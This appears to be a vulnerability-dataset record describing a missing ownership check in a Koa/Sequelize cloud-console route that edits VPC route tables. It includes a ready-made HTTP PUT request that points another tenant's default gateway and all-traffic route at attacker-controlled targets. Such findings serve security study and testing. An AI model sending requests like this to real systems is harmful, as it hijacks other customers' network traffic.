diagnosis: The Koa route updates VPC route tables and default gateways in Sequelize using routeTableId directly from route parameters. It fails to check if the route table or parent VPC belongs to ctx.state.user.accountId. An attacker can re-route network traffic of target cloud customers to a malicious gateway router.
exploit_request:
PUT /cloud/vpcs/vpc-901844/route-tables/rtb-038ba981e4 HTTP/1.1
Host: console.cloudinfrastructure.net
Authorization: Bearer <user_jwt>
Content-Type: application/json

{"defaultGateway": "igw-attacker-controlled-gw", "routes": [{"destinationCidr": "0.0.0.0/0", "target": "eni-attacker"}]}
